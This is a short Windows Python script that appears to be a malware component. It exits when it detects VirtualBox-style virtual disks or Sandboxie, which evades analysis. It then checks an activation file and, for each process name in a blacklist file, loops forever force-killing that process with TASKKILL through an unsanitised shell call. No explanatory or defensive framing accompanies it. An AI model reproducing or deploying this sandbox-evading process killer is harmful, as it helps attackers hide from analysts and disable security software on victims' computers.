import subprocess, platform, os
from threading import Thread
import ctypes, wmi
from multiprocessing import Process
system = platform.system()
lines = []
def main():
    for line in lines:
        line = line.rstrip('\n')
        p = Process(target=KILL, args=(line,))
        p.start()

def KILL(process):
    while True:
        subprocess.call(f"TASKKILL /F /IM {process}", shell=True)

def detectSandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False

if detectVM() == True:
    exit()
if detectSandboxie() == True:
    exit()

if __name__ == '__main__':
    f = open(r'data\activate.sys', 'r')
    foo = f.read()
    f.close()
    if foo == "True":
        pass
    else:
        exit()
    with open(r'data\blacklist.txt') as f:
        lines = f.readlines()
    main()
